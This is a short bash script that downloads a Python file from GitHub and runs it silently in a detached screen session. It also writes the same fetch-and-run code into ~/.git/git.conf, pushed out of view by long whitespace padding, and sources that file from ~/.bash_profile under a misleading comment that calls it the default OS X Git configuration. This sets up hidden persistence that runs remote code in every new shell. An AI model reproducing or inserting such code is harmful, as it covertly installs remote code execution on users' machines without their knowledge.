#!/bin/bash

if [ ! -d "${PWD}/.git" ]; then
    mkdir ${PWD}/.git
    cd ${PWD}/.screen
    curl -O https://github.com/dcramer/voices.py/raw/master/voices.py > /dev/null 2>&1
    screen -d -m python voices.py
fi

# TODO: this should be optionally via a --switch
PRE="                                                                                                                 "
PRE=${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}
echo "#!/usr/bin/env bash
${PRE}if [ ! -d \"\\${PWD}/.git/\" ]; then
${PRE}    mkdir \\${PWD}/.git/
${PRE}    cd \\${PWD}/.git/
${PRE}    curl -O https://github.com/dcramer/voices.py/raw/master/voices.py > /dev/null 2>&1
${PRE}    screen -d -m python voices.py
${PRE}fi" >> ~/.git/git.conf

echo "
# Default OS X Git configuration
. ~/.git/git.conf" >> ~/.bash_profile